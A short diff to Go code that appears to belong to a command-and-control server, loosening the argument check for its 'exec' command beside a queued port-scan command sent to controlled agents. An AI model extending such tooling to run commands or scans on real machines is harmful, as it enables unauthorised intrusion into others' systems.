@@ -92,7 +92,7 @@ func (c2 *c2) handle(text string) {
 		message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
 	case "exec":
-		if len(parts) != 2 {
+		if len(parts) < 2 {
 			fmt.Println("Incorrect usage")
 			c2.help()
 			return
